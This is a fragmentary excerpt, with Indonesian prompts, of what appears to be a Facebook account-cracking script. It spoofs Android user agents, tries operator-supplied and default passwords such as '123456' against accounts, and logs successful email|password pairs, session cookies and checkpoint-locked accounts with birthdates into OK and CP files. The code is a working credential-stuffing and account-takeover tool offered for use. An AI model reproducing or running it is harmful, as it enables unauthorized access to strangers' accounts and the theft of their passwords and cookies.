...
JHALLA_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
JHALLA_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
...
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; U; Android 10; POT-LX1AF Build/HUAWEIPOT-L21AF; wv)'
	...
	E = f' Mobile Safari/537.36 OPR/63.0.2254.62069'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)
...
def login():
	...
	try:
		...
		#ses.post(f"https://graph.facebook.com/100018396913729?fields=subscribers&access_token={token}",headers=(cookies=cok)
...
def cek_akun():
	...
	xxx = input(' JHALLApan akun tidak kenon ke file apa : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
...
def manual():
	...
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {JHALLA_ok}\n akun cp di : {JHALLA_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
...
def gabung():
	...
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}•••{P}] MASUKAN SANDI MANUAL 6 HURUF\n sandi  : ').split(',')
	C = input(f' [{hh}•••{P}] MASUKAN SANDI BELAKANG NAMA\n sandi  : ')
	if ',' in str(C):
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r {kk}>> EMAIL  : {kk}{idf}{P}          \n {kk}>> SANDI  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+JHALLA_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n {kk}>> EMAIL : {kk}{idf}{P}          \n {kk}>> SANDI  : {kk}{pw}          {P}\n')
							os.popen('')
							open('CP/'+JHALLA_cp,'a').write(idf+'|'+pw+'\n')
							break
				...
				if data in resok:pass
					...
					resok.append(data)
					ok+=1
					open('OK/'+JHALLA_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print("\n %sEMAIL & SANDI : %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
						print("\r %sCOOKIES : %s "%(H,kuki))
						print
						os.popen('')
						break
					elif "apk" in akunok:
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		else:open('CP/'+JHALLA_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+JHALLA_cp,'a').write(idf+'|'+pw+'\n')
	try:
